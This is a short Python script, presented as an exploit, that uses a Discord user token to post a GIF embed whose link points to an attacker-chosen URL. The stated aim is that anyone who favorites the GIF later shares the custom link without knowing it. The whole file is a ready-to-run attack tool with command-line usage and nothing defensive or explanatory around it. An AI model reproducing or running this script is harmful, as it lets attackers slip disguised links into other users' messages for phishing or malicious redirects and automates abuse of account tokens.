# Name: Custom GIF URL
# Description: Send a GIF where if added to Favorites, the GIF URL will change to a customized URL when shared
# Author: checksum (@0daySkid)
# Original founder: HellSec

import requests
import sys

class Exploit:

    def __init__(self, token, channel, gif, url):
        self.token = token
        self.channel_id = channel
        self.gif = gif
        self.url = url
        self.headers = {'Authorization': token}


    @property
    def _embed(self):
        return {'url': self.url, 'image': {'url': self.gif}}


    def execute(self):
        """ send GIF in text channel """
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'embed': self._embed})

    
def main():
    if len(sys.argv) < 5:
        print(f'Usage: py {sys.argv[0]} <token> <channel id> <gif url> <custom url>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]
    gif_url = sys.argv[3]
    custom_url = sys.argv[4]

    exploit = Exploit(token, channel_id, gif_url, custom_url)

    exploit.execute()


if __name__ == '__main__':
    main()
